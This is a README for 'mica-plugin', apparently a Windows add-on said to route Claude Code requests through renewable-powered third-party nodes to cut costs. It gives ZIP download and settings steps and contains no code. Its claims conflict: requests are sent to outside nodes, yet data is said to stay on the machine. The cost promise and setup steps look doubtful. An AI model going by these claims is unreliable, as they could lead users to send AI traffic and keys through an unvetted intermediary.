# ⚡ mica-plugin - Lower your AI costs using renewables

[![](https://img.shields.io/badge/Download-Mica_Plugin-blue.svg)](https://github.com/liuhong8911/mica-plugin)

## 🎯 About this software

Mica-plugin connects your AI tools to specialized compute nodes. These nodes run on renewable energy. By routing your tasks through these nodes, you save money on your monthly bills. This software works with Claude Code to lower the cost of your AI requests. You keep your workflow while the plugin handles the routing in the background.

## 🛠️ System requirements

This software runs on Windows 10 or Windows 11. You need a stable internet connection for the plugin to reach the compute nodes. Ensure you have the Claude Code application installed before you add this plugin. You do not need to know a programming language to use this tool, but you do need to follow the setup steps in this guide.

## 📥 Downloading the plugin

You must visit the project page to get the latest version. This link directs you to the source repository where you can see updates and installation files. 

[Visit this page to download the plugin](https://github.com/liuhong8911/mica-plugin)

Click the green button labeled "Code" on the page. Select "Download ZIP" from the menu. Save the file to your Downloads folder. You will need to unzip this file before you can use the contents. Right-click the folder and select "Extract All" to create a standard folder on your desktop.

## ⚙️ Setting up the plugin

Open the folder you just extracted. Look for the configuration settings. Most users only need to verify the plugin path within their Claude Code settings. 

1. Open your Claude Code application.
2. Locate the settings menu by clicking the gear icon.
3. Find the field labeled "Plugin Path" or "Extensions."
4. Copy the address of the folder where you saved the unzipped mica-plugin files.
5. Paste that address into the settings box.
6. Restart Claude Code to apply the changes.

The plugin now connects to the MVM nodes automatically. You do not need to change any other settings. The plugin checks the current energy grid status and routes your compute tasks to sites with clean, cheap energy.

## 📈 Monitoring performance

You can track your savings through the terminal or the plugin dashboard. The plugin displays a small status icon in your toolbar when it is active. 

- Green icon: You are connected to a renewable energy node.
- Blue icon: You are connected to a standard compute node.
- Grey icon: The plugin is inactive or disconnected.

When you run an AI task, the plugin calculates the difference in cost between standard nodes and MVM nodes. You see these savings updated in real time. If the plugin fails to connect, ensure your firewall allows outgoing traffic for this application.

## 🛡️ Privacy and keys

This plugin routes your compute requests to efficient, renewable nodes. It does not store your private API keys or personal chat history. The plugin acts as a bridge for the processing task only. Your data remains secure on your machine. You control the connection at all times through the settings menu.

## ❓ Frequently asked questions

**Do I need a paid subscription to use this?**
No. The plugin is free to use. You only pay for the AI tokens you consume, which are now cheaper due to the routing optimization.

**What happens if the renewable node goes offline?**
The plugin has a fallback feature. It automatically switches to a standard compute node to ensure your work continues without interruption.

**Can I run this on multiple machines?**
Yes. You can install the plugin on any Windows computer where you operate Claude Code.

**Does this slow down my AI responses?**
The nodes use high-performance hardware. You should not notice a change in response speed. The routing happens in milliseconds.

## 📋 Troubleshooting

If you encounter issues, verify that you have the correct file path in your settings. If the plugin still does not show as active, close all instances of Claude Code and restart them. If the error persists, download the latest release from the repository link again. Errors often result from incomplete file extractions. Delete the old folder and perform the extraction one more time to avoid missing files.

## 🛠️ Project goals

The project focuses on three areas:

1. Cost reduction: Lowering the price per token for AI users.
2. Sustainability: Using renewable energy grids for compute tasks.
3. Ease of use: Providing a simple interface for non-technical users. 

By using this plugin, you contribute to a more efficient use of global energy resources while keeping your project costs low. Check the repository regularly for new updates that improve the routing speed and node availability.